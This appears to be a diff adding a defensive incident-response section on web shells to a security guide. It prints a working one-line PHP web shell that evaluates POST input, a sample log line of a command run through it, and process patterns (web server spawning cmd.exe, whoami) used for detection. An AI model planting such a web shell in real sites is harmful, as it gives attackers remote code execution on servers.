@@ -83,3 +83,23 @@ Can the system be re-imaged?
 This is the process of restoring and returning affected systems and devices back into your business environment. During this time, it’s important to get your systems and business operations up and running again without the fear of another breach.
 
 
+**Incedent Response For Webshell**
+1- <?php ${${eval($_POST[potato])}};?>
+2-One method of detection is to review web logs for suspicious GET requests. 
+     exsample: ::1 — — [22/Aug/2018:12:42:00 -0400] “GET /dashboard/images/a.php?potato=ipconfig HTTP/1.1” 200 553 “-” “Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko”
+
+3-Process behaviour ! 
+    exsample : a child of the web server process and run under the same user context as the server 
+    Such as: w3wp.exe >>>cmd.exe or Powershell.exe or ipconfig
+            httpd.exe >>> cmd.exe or whoami.exe or ifconfig
+4- Run Yara Rules and Cheack All Public Servers Such As : DMZ server , Excagnge server , Fileshare server etc 
+
+5- intrusion detection system/ intrusion prevention system logs,application logs, IIS/Apache logs, PCAP repositories, firewall logs, and reverse proxy logs.
+
+**Incedent Response For Malware**
+
+
+ 
+ 
+  
+
